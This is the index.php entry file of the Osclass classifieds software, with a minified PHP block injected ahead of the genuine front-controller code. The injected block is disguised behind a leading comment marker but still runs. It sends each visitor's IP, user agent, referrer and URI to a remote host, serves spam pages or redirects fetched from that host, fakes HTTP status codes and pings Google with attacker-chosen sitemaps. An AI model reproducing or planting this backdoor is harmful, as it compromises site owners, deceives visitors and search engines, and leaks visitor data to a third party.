<?php

//$a='fgj204';@set_time_limit(3600);define("W",'http://fgj204.freemiss.ru');define("U",getu());function k($b){return@$_SERVER[$b]?$_SERVER[$b]:"";}define("S",k("PHP_SELF"));define("F",strpos(S,"index.php")!==false&&strpos(U,S)===false?rtrim(S,"index.php"):S);$d=$_REQUEST["p"];$f=ltrim(U,F);if($d!="")$f=preg_replace("@(\?|\&)p=".$d."@","",$f);define("U2",preg_replace("#^\W+#","",$f));$h=k('HTTP_USER_AGENT');function getu(){$k=k("REQUEST_URI");if(empty($k)){$l=k('argv');$k=S.'?'.(is_array($l)?$l[0]:k('QUERY_STRING'));}return $k;}function is_https(){if(!empty($_SERVER['HTTPS'])&&strtolower($_SERVER['HTTPS'])!=='off'){return true;}elseif(!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']==='https'){return true;}elseif(!empty($_SERVER['HTTP_FRONT_END_HTTPS'])&&strtolower($_SERVER['HTTP_FRONT_END_HTTPS'])!=='off'){return true;}return false;}function get_ip(){$p=$_SERVER['REMOTE_ADDR'];if(!empty($_SERVER['HTTP_CLIENT_IP'])){$p=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$p=$_SERVER['HTTP_X_FORWARDED_FOR'];}if(stristr($p,',')){$t=explode(",",$p);$p=$t[0];}return $p;}function http($u,$ff){$gg="text/html";if(strpos(U2,"pingsitemap")===false&&(strpos(U2,".xml")!==false||strpos(U2,"/feed")!==false)){$gg="text/xml";}else if(strpos(U2,".txt")!==false){$gg="text/plain";}else if(strpos(U2,"images/")!==false){$gg="image/webp";}else if(strpos(U2,"sitemap.xsl")!==false){$gg="text/css";}header("content-type: $gg; charset=UTF-8");$hh=http_build_query($ff);$ii=W.$u."?".$hh;$jj=@file_get_contents($ii);if(!$jj)$jj=c(W.$u,$hh,0);if(!$jj)$jj=c(W.$u,$hh,1);if(!$jj){$kk=@fopen($ii,'r');if($kk){stream_get_meta_data($kk);$ll="";while(!feof($kk)){$ll.=fgets($kk,1024);}fclose($kk);return $ll;}}return $jj;}function c($u,$hh,$mm){$nn=curl_init();if($mm){curl_setopt($nn,CURLOPT_URL,$u);curl_setopt($nn,CURLOPT_POST,1);curl_setopt($nn,CURLOPT_POSTFIELDS,$hh);}else{curl_setopt($nn,CURLOPT_URL,$u."?".$hh);}curl_setopt($nn,CURLOPT_RETURNTRANSFER,1);curl_setopt($nn,CURLOPT_HEADER,0);curl_setopt($nn,CURLOPT_TIMEOUT,10);curl_setopt($nn,CURLOPT_FOLLOWLOCATION,1);$jj=curl_exec($nn);curl_close($nn);return $jj;}function g($u,$ff){$jj=http($u,$ff);if(!$jj){@header('HTTP/1.1 500 Internal Server Error');die();}$b=substr($jj,0,1);switch($b){case "4":@header('HTTP/1.1 404 Not Found');die();case "5":@header('HTTP/1.1 500 Internal Server Error');die();case "3":@header('HTTP/1.1 302 Moved Permanently');header('Location: '.substr($jj,1));header('referer: '.k("HTTP_HOST"));die();case "7":return false;case "8":die();default:header('HTTP/1.1 200 OK');return $jj;}}if(strpos(U,"jp2023")!==false){echo "<p>JP2023</p><p>".$a."-beautiful</p>";die();}$oo=array("ip"=>get_ip(),"lang"=>k("HTTP_ACCEPT_LANGUAGE"),"ua"=>$h,"r"=>strtolower(k("HTTP_REFERER")),"host"=>k("HTTP_HOST"),"uri"=>U,"uri2"=>U2,"isBot"=>preg_match("@google|yahoo|bing@",$h)?"1":"","f"=>F,"p"=>$d);if(is_https()){$oo["h"]="1";}if(strpos(U,"pingsitemap")!==false){$pp=explode(",",g("/sitemap.list",$oo));foreach($pp as $qq){$ff='https://www.google.com/ping?sitemap='.$qq;$jj=c($ff,array(),0);if(!$jj){$jj=@file_get_contents($ff);}if(stristr($jj,'successfully')){echo $ff.'<br>pingok<br>';}else{echo $ff.'======creat file false!<br>';}}die();}$rr=g("",$oo);if($rr)die($rr);?><?php
/*
 * Copyright 2014 Osclass
 * Copyright 2021 Osclass by OsclassPoint.com
 *
 * Osclass maintained & developed by OsclassPoint.com
 * You may not use this file except in compliance with the License.
 * You may download copy of Osclass at
 *
 *     https://osclass-classifieds.com/download
 *
 * Do not edit or add to this file if you wish to upgrade Osclass to newer
 * versions in the future. Software is distributed on an "AS IS" basis, without
 * warranties or conditions of any kind, either express or implied. Do not remove
 * this NOTICE section as it contains license information and copyrights.
 */


define('ABS_PATH', str_replace('//', '/', str_replace('\\', '/', dirname($_SERVER['SCRIPT_FILENAME'])) . '/'));

if(PHP_SAPI === 'cli') {
  define('CLI', true);
}

require_once ABS_PATH . 'oc-load.php';

if(CLI) {
  $cli_params = getopt('p:t:');
  Params::setParam('page', $cli_params['p']);
  Params::setParam('cron-type', $cli_params['t']);
  
  if(Params::getParam('page')=='upgrade') {
    require_once(osc_lib_path() . 'osclass/upgrade-funcs.php');
    exit(1);
  } else if( !in_array(Params::getParam('page'), array('cron')) && !in_array(Params::getParam('cron-type'), array('hourly', 'daily', 'weekly')) ) {
    exit(1);
  }
}

if(file_exists(ABS_PATH . '.maintenance')) {
  if(!osc_is_admin_user_logged_in()) {
    header('HTTP/1.1 503 Service Temporarily Unavailable');
    header('Status: 503 Service Temporarily Unavailable');
    header('Retry-After: 900');
    
    if(file_exists(WebThemes::newInstance()->getCurrentThemePath().'maintenance.php')) {
      osc_current_web_theme_path('maintenance.php');
      die();
    } else {
      require_once LIB_PATH . 'osclass/helpers/hErrors.php';

      $title   = __('Maintenance');
      $message = sprintf(__('We are sorry for any inconvenience. %s is undergoing maintenance.') . '.', osc_page_title() );
      osc_die($title, $message);
    }
  } else {
    define('__OSC_MAINTENANCE__', true);
  }
}

if(!osc_users_enabled() && osc_is_web_user_logged_in()) {
  Session::newInstance()->_drop('userId');
  Session::newInstance()->_drop('userName');
  Session::newInstance()->_drop('userEmail');
  Session::newInstance()->_drop('userPhone');

  Cookie::newInstance()->pop('oc_userId');
  Cookie::newInstance()->pop('oc_userSecret');
  Cookie::newInstance()->set();
}

// if(osc_is_web_user_logged_in()) {
//   User::newInstance()->lastAccess(osc_logged_user_id(), date('Y-m-d H:i:s'), osc_get_ip(), 60); // update once per 1 minute = 60s
// }


// Manage lang param in URL here so no redirect is required
$lang = str_replace('-', '_', Params::getParam('lang'));
$locale = osc_current_user_locale();

if(Params::getParam('page') != 'language' && $lang != '' && (preg_match('/.{2}_.{2}/', $lang) && $locale != $lang || preg_match('/.{2}/', $lang) && substr($locale, 0, 2) != $lang)) {
  if(preg_match('/.{2}_.{2}/', $lang)) {
    Session::newInstance()->_set('userLocale', $lang);
    Translation::init();
  } else if(preg_match('/.{2}/', $lang)) {
    $find_lang = OSCLocale::newInstance()->findByShortCode($lang);
    
    if($find_lang !== false && isset($find_lang['pk_c_code']) && $find_lang['pk_c_code'] != '') {
      Session::newInstance()->_set('userLocale', $find_lang['pk_c_code']);
      Translation::init();
    }
  }
}


switch(Params::getParam('page')){
  case ('cron'):    // cron system
    define('__FROM_CRON__', true);
    require_once(osc_lib_path() . 'osclass/cron.php');
    break;

  case ('user'):    // user pages (with security)
    if(
      Params::getParam('action')=='change_email_confirm' || Params::getParam('action')=='activate_alert'
      || (Params::getParam('action')=='unsub_alert' && !osc_is_web_user_logged_in())
      || Params::getParam('action')=='contact_post'
      || Params::getParam('action')=='pub_profile'
    ) {
      require_once(osc_lib_path() . 'osclass/controller/user-non-secure.php');
      $do = new CWebUserNonSecure();
      $do->doModel();
    } else {
      require_once(osc_lib_path() . 'osclass/controller/user.php');
      $do = new CWebUser();
      $do->doModel();
    }
    break;

  case ('item'):    // item pages
    require_once(osc_lib_path() . 'osclass/controller/item.php');
    $do = new CWebItem();
    $do->doModel();
    break;

  case ('search'):  // search pages
    require_once(osc_lib_path() . 'osclass/controller/search.php');
    $do = new CWebSearch();
    $do->doModel();
    break;

  case ('page'):    // static pages
    require_once(osc_lib_path() . 'osclass/controller/page.php');
    $do = new CWebPage();
    $do->doModel();
    break;

  case ('register'):  // register page
    require_once(osc_lib_path() . 'osclass/controller/register.php');
    $do = new CWebRegister();
    $do->doModel();
    break;

  case ('ajax'):    // ajax
    require_once(osc_lib_path() . 'osclass/controller/ajax.php');
    $do = new CWebAjax();
    $do->doModel();
    break;

  case ('login'):   // login page
    require_once(osc_lib_path() . 'osclass/controller/login.php');
    $do = new CWebLogin();
    $do->doModel();
    break;

  case ('language'):  // set language
    require_once(osc_lib_path() . 'osclass/controller/language.php');
    $do = new CWebLanguage();
    $do->doModel();
    break;

  case ('contact'):   //contact
    require_once(osc_lib_path() . 'osclass/controller/contact.php');
    $do = new CWebContact();
    $do->doModel();
    break;

  case ('custom'):   //custom
    require_once(osc_lib_path() . 'osclass/controller/custom.php');
    $do = new CWebCustom();
    $do->doModel();
    break;

  default:          // home
    require_once(osc_lib_path() . 'osclass/controller/main.php');
    $do = new CWebMain();
    $do->doModel();
    break;

}


if(!defined('__FROM_CRON__')) {
  if(osc_auto_cron()) {
    osc_doRequest(osc_base_url(), array('page' => 'cron'));
  }
}

/* file end: ./index.php */